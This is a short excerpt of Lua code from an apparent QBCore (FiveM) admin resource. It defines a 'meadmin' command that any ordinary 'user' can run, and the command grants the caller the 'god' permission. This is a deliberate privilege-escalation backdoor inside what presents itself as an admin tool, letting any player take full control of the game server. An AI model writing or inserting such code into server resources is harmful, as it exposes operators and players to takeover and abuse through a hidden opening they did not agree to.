...
QBCore.Functions.CreateCallback('nmsh-admin:server:havePermission', function(source, cb)
...
QBCore.Commands.Add('meadmin', 'Give Your Self Admin', {}, false, function(source, args)
    local Player = QBCore.Functions.GetPlayer(source)
    if Player then
        QBCore.Functions.AddPermission(Player.PlayerData.source, 'god')
        TriggerClientEvent('QBCore:Notify', source, 'Done You Got God', 'success')
    end
end, 'user')
